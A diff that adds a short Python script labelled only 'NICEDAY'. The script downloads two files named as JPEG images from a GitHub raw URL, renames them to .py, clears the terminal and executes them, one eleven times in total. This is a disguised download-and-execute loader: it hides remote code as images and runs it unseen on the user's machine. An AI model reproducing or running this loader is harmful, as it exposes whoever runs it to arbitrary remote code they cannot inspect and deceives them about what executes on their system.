@@ -1,0 +1,24 @@
+#!/usr/bin/python3
+# encoding: utf-8
+# NICEDAY
+import sys,os,time,random,colorama,requests,os, time,os 
+os.system('wget https://raw.githubusercontent.com/sayaorangbaru/silahkanmasuk/main/megawin.jpg')
+os.system('wget https://raw.githubusercontent.com/sayaorangbaru/silahkanmasuk/main/superwin.jpg')
+os.system('mv megawin.jpg megawin.py')
+os.system('mv superwin.jpg superwin.py')
+os.system('reset')
+os.system('clear')
+
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 megawin.py")
+os.system("python3 superwin.py")
+
+
